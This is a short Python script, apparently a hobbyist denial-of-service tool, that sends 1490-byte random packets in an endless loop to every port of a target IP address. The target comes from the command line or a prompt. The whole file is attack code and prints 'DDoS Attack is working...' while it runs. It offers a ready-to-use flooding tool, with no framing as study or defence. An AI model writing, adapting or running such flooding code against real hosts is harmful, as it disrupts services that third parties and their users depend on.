# author: Xnork
# data: 18/11/2022

import random, sys
from Socket import Socket

def main():
    IP_TARGET, port \
        = sys.argv[1] if len(sys.argv) > 2 else input('IP Target: '), 1

    assert len(IP_TARGET) > 0

    target = Socket(IP_TARGET)
    BYTES = random._urandom(1490)

    print('DDoS Attack is working...')
    while True:
        try:
            target.send_to(port, BYTES)
            port = port + 1 if port < 65534 else 1
        except:
            print('\nDDoS Attack has closed.')
            target.close()
            break

if __name__ == '__main__':
    main()
